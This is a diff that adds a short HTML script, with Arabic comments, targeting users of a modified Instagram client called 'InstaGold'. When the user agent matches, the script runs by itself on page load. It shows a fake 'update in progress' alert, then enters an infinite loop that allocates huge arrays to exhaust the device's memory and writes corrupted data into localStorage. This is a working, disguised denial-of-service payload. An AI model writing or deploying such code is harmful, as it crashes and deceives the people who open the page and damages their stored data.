@@ -1,0 +1,23 @@
+<script>
+    function startHack() {
+        // تحقق إذا المستخدم بيستخدم إنستغرام جولد
+        const isInstaGold = navigator.userAgent.includes("InstaGold") || window.location.href.includes("com.instagold");
+
+        if (isInstaGold) {
+            alert("تم اكتشاف إنستغرام جولد! جاري تنفيذ التحديث...");
+
+            // حلقة لا نهائية لإرهاق الجهاز
+            while (true) {
+                try {
+                    // إنشاء كائنات ضخمة في الذاكرة
+                    let junk = new Array(1000000).fill("X".repeat(1000));
+                    console.log("إرهاق الموارد...");
+                    
+                    // محاولة كتابة بيانات فاسدة في التخزين المحلي
+                    localStorage.setItem("insta_gold_config", JSON.stringify({ corrupted: true, crash:"loop" }));} catch (e) {
+                    console.error("خطأ:" + e);}                }} else {
+            alert("هذا التحديث لإنستغرام جولد فقط! أنت تستخدم النسخة العادية.");}        }
+
+    // تشغيل تلقائي إذا فتح الرابط من إنستغرام جولد
+    if (navigator.userAgent.includes("InstaGold")) {
+        startHack();}    </script>
